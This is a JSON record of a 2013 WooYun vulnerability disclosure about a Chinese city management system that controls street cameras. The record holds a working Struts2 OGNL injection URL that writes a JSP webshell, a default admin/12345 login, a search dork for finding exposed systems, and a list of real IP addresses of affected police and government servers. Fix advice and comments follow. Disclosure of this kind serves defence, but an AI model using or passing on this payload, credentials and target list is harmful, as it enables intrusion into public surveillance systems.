{"id": 8855, "wybug_id": "wooyun-2013-031567", "wybug_title": "某套城市综合管理系统任意执行加弱口令(街道摄像头任意控制)", "wybug_corp": "杭州海康威视系统技术有限公司", "wybug_author": "Kuuki", "wybug_date": "2013-07-20 23:08", "wybug_open_date": "2013-10-18 23:08", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行", "弱口令", "权限设置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-18：\t细节向公众公开  简要描述： 某套城市综合管理系统任意执行加弱口令，可以实时查看或控制市内摄像头...还可能有其他敏感信息泄露...希望早日修复 以免被不法分子利用 详细说明：  命令执行点\nhttp://xxxxx/index!OAIndex.action\n我测试的几个均为windows服务器system权限GETSHELL方法\nhttp://xxxxx/index!OAIndex.action?redirect:${ %23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'), %23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll(\"\\\\\\\\\", \"/\"), new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close() }&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e\n在当前目录下创建css3.jsp一句话木马然后用表单的方式就可以post大马 从而得到webshell部分系统没有修改系统管理员的默认密码可以直接登录\n用户名:admin 密码:12345\n受影响的服务器百度搜索 intitle:“平安城市综合应用管理系统”http://122.226.131.93/ 浙江省台州市 http://124.93.232.5/ 辽宁省大连市http://sx37.net/ 福建省宁德市福安市http://222.223.66.39/  河北省秦皇岛市http://61.153.17.126/ 浙江省宁波市 http://61.175.218.206/ 浙江省台州市http://124.117.238.228/ 新疆省乌鲁木齐市........目测还有更多目标服务器大多为警方或政府用 在我测试的服务器中还发现有其他重要系统而且同C段下也有很多重要服务器 如果作为跳板也是比较大的危害了   漏洞证明：  我测试的是河北省秦皇岛市 直接用弱口令就可以进\n\n\n\n   修复方案：  1.升级struts2到最新版本2.取消默认密码 强制管理员设置自己的密码3.修改robots.txt使服务器不被搜索引擎收录4.专人专用 尽量不要对外网开放   版权声明：转载请注明来源 Kuuki@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2013-07-24 23:17 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-20 23:09 |    \t\tKuuki \t\t\t( 普通白帽子  |\t\t\t        Rank:158 漏洞数:23        | :P)\t\t \n  又秒过 自己坐个沙发 ~    \n     2013-07-20 23:13 |    \t\tf0r \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:12        | 寻声暗问弹者谁？那人却在灯火阑珊处)\t\t \n  求带    \n     2013-07-21 00:43 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  坐等细节~    \n     2013-08-14 11:10 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  摄像头拍不到室内啊    \n     2013-10-19 00:32 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  @wefgod  - -亮了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}